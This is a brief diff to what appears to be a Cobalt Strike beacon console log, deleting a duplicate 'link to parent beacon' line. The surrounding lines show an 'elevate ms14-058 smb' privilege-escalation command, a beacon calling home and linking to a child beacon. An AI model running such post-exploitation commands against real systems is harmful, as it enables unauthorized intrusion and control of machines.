@@ -66,8 +66,6 @@ beacon> elevate ms14-058 smb
 [+] host called home, sent: 204885 bytes
 [+] established link to child beacon: 192.168.56.105
 
-[+] established link to parent beacon: 192.168.56.105
-
 beacon> getuid
 [*] Tasked beacon to get userid
 [+] host called home, sent: 8 bytes
